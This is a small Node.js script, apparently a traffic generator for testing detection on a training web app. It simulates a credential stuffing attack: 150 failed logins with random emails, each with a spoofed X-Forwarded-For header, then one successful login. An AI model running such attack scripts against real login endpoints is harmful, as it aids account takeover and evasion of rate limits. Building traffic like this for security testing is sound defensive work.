const  ora = require('ora')
const logSymbols= require('log-symbols');
const { http } = require('../lib/request');
const { faker } = require('@faker-js/faker');


const failedLoginThreshold = 150;

async function credentialStuffing(targetURL){

    //create a valid user
    await http().post(targetURL + '/api/Users', {
        "email":"bla@bla.com",
        "password":"blabla",
        "passwordRepeat":"blabla",
        "securityQuestion": {
            "id":1,
            "question":"Mother\'s maiden name?",
            "createdAt":"2023-04-13T14:08:40.000Z",
            "updatedAt":"2023-04-13T14:08:40.000Z"
        },
        "securityAnswer":"bla"
    });

    const spinner = ora('Running basic credential stuffing attack').start();

    // Failed logins
    for (var i = 0; i < failedLoginThreshold; i++) {
        let email = faker.internet.email();
        const config = {
            method: 'POST',
            url: targetURL + '/rest/user/login',
            headers: {
                'X-Forwarded-For': '1.2.3.4'
            },
            data : {
                "email": email ,
                "password": "notblabla"
            }
        };
        spinner.text = 'Failed login for email : ' + email;
        await http().custom(config)
        await new Promise(r => setTimeout(r, 100));
    }

    spinner.text = 'Successful login for email : ' + "bla@bla.com";
    // Succesful one
    const config = {
        method: 'POST',
        url: targetURL + '/rest/user/login',
        headers: {
            'X-Forwarded-For': '1.2.3.4'
        },
        data : {
            "email": "bla@bla.com",
            "password": "blabla"
        }
    };

    await http().custom(config)
    await new Promise(r => setTimeout(r, 1000));

    spinner.stopAndPersist({
        symbol: logSymbols.success,
        text: 'Credential stuffing attack - done',
    });
}

module.exports = { credentialStuffing }